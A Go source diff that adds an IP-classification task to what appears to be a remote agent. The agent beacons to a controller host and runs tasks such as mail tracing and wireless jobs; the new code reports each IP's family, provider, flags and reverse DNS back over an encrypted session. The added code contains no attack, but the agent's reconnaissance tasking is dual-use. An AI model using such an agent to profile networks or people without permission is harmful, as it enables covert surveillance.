@@ -340,6 +340,12 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runMailTrace(conn, sess, m)
+		case proto.TypeGeoIPStart:
+			var g proto.GeoIPStart
+			if err := json.Unmarshal(env.Payload, &g); err != nil {
+				continue
+			}
+			go runGeoIP(conn, sess, g)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -2085,4 +2091,38 @@ func runMailTrace(conn net.Conn, sess *crypto.Session, m proto.MailTraceStart) {
 		Suspects:   tr.Suspect,
 		Done:       true,
 	})
+}
+
+// runGeoIP classifies each IP and streams the results back.
+func runGeoIP(conn net.Conn, sess *crypto.Session, g proto.GeoIPStart) {
+	var lines []string
+	for _, ip := range g.IPs {
+		c, err := recon2.ClassifyIP(ip)
+		if err != nil {
+			lines = append(lines, ip+"|error|"+err.Error()+"||")
+			continue
+		}
+		flags := ""
+		if len(c.Flags) > 0 {
+			flags = joinStrings(c.Flags, ",")
+		}
+		lines = append(lines, c.IP+"|"+c.Family+"|"+c.Provider+"|"+flags+"|"+c.PTR)
+	}
+	sendTunnelAck(conn, sess, proto.TypeGeoIPData, proto.GeoIPData{
+		SessionID: g.SessionID,
+		Results:   lines,
+		Done:      true,
+	})
+}
+
+// joinStrings is a small helper for the recon2 flag list.
+func joinStrings(s []string, sep string) string {
+	if len(s) == 0 {
+		return ""
+	}
+	out := s[0]
+	for _, x := range s[1:] {
+		out += sep + x
+	}
+	return out
 }
